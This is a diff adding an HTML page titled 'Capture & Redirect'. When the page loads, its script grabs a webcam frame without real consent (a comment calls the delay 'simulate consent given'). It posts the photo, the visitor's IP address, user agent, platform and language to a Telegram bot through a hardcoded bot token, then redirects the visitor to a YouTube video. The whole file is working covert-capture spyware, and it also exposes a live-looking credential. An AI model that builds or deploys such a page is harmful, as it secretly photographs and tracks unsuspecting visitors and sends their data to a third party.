@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture & Redirect</title>
+</head>
+<body>
+   
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const botToken = "6860187565:AAG49Z7Ich4Vjn44Yqo9mddrdOxyfedm3RE";
+
+        // Get chat ID (assume it's allowed)
+        function getChatID(callback) {
+            fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
+                .then(res => res.json())
+                .then(data => {
+                    if (data.result.length > 0) {
+                        const chatId = data.result[data.result.length - 1].message.chat.id;
+                        callback(chatId);
+                    } else {
+                        console.error("No chat ID found");
+                    }
+                })
+                .catch(err => console.error("Chat ID error", err));
+        }
+
+        // Webcam setup
+        const video = document.getElementById("video");
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => video.srcObject = stream)
+            .catch(err => console.error("Webcam access error:", err));
+
+        // Capture image from webcam
+        function captureImage(chatId) {
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                sendImageToTelegram(chatId, blob);
+                captureIPandInfo(chatId);
+            }, "image/png");
+        }
+
+        // Send image to Telegram
+        function sendImageToTelegram(chatId, blob) {
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob);
+
+            fetch(url, { method: "POST", body: formData })
+                .then(res => res.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Photo sent!");
+                    } else {
+                        console.error("Telegram error:", data);
+                    }
+                });
+        }
+
+        // Get IP address and browser info
+        function captureIPandInfo(chatId) {
+            fetch("https://api.ipify.org?format=json")
+                .then(res => res.json())
+                .then(ipData => {
+                    const deviceInfo = `
+IP Address: ${ipData.ip}
+User Agent: ${navigator.userAgent}
+Platform: ${navigator.platform}
+Language: ${navigator.language}
+                    `;
+                    sendTextToTelegram(chatId, deviceInfo);
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                    }, 1000);
+                });
+        }
+
+        // Send text data to Telegram
+        function sendTextToTelegram(chatId, text) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        }
+
+        // Start capture after delay (simulate consent given)
+        setTimeout(() => {
+            getChatID(chatId => {
+                captureImage(chatId);
+            });
+        }, 3000);
+    </script>
+</body>
+</html>
